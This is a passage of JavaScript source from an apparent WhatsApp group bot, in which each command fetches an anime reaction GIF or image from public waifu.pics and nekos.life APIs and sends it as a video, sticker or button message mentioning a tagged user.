          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'smile': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/smile`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} smiled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} smiled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'wave': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/wave`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} waved themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} waved @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'awoo': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/awoo`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} awooed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} awooed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'blush': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/blush`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} blushed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} blushed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'smug': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/smug`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} smugged themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} smugged @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'glomp': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/glomp`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} glomped themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} glomped @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'happy': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/happy`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} happied themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} happied @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'dance': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/dance`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} danced themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} danced @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cringe': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cringe`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cringed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cringed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cuddle': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cuddle`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cuddled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cuddled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'highfive': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/awoo`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} highfived themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} highfived @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'handhold': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/handhold`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} handheld themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} handheld @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
                case 'spank': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/spank`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} spanked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} spanked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'feed': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/feed`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} fed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} fed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
                case 'tickle': {

        if (!m.isGroup) return aespispStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcaespisp(`Tag or reply to a person`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/tickle`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} tickled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} tickled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ArielStore.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: ftroli })

        } catch (error) {

          console.log(error);

        }

      }

        break;
case 'shinobu':{
axios.get(`https://api.waifu.pics/sfw/shinobu`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'stickhandhold': {
axios.get(`https://api.waifu.pics/sfw/handhold`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'stickshinobu': {
axios.get(`https://api.waifu.pics/sfw/shinobu`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'stickhighfive': {
axios.get(`https://api.waifu.pics/sfw/highfive`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'stickcuddle': {
axios.get(`https://api.waifu.pics/sfw/cuddle`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'stickcringe': {
axios.get(`https://api.waifu.pics/sfw/cringe`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'stickdance': {
axios.get(`https://api.waifu.pics/sfw/dance`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'stickhappy': {
axios.get(`https://api.waifu.pics/sfw/happy`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'stickglomp': {
axios.get(`https://api.waifu.pics/sfw/glomp`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'sticksmug': {
axios.get(`https://api.waifu.pics/sfw/smug`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'stickblush': {
axios.get(`https://api.waifu.pics/sfw/blush`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'stickawoo': {
axios.get(`https://api.waifu.pics/sfw/awoo`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'stickwave': {
axios.get(`https://api.waifu.pics/sfw/wave`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'sticksmile': {
axios.get(`https://api.waifu.pics/sfw/smile`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'stickslap': {
axios.get(`https://api.waifu.pics/sfw/slap`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'sticknom': {
axios.get(`https://api.waifu.pics/sfw/nom`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'stickpoke': {
axios.get(`https://api.waifu.pics/sfw/poke`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'stickwink': {
axios.get(`https://api.waifu.pics/sfw/wink`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'stickbonk': {
axios.get(`https://api.waifu.pics/sfw/bonk`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'stickbully': {
axios.get(`https://api.waifu.pics/sfw/bully`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'stickyeet': {
axios.get(`https://api.waifu.pics/sfw/yeet`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'stickbite': {
axios.get(`https://api.waifu.pics/sfw/bite`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'stickkiss': {
axios.get(`https://api.waifu.pics/sfw/kiss`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'sticklick': {
axios.get(`https://api.waifu.pics/sfw/lick`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'stickpat': {
axios.get(`https://api.waifu.pics/sfw/pat`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'stickhug': {
axios.get(`https://api.waifu.pics/sfw/hug`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'stickkill': {
axios.get(`https://api.waifu.pics/sfw/kill`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'stickcry': {
axios.get(`https://api.waifu.pics/sfw/cry`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'stickspank':{
                axios.get(`https://nekos.life/api/v2/img/spank`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'sticktickle':{
                axios.get(`https://nekos.life/api/v2/img/tickle`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'meow':{
                axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
ArielStore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.ownername })
})
}
break
case 'animeawoo':{
await aespispStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
 let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animemegumin':{
await aespispStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeshinobu':{
await aespispStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animehandhold':{
await aespispStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animehighfive':{
await aespispStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animecringe':{
await aespispStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
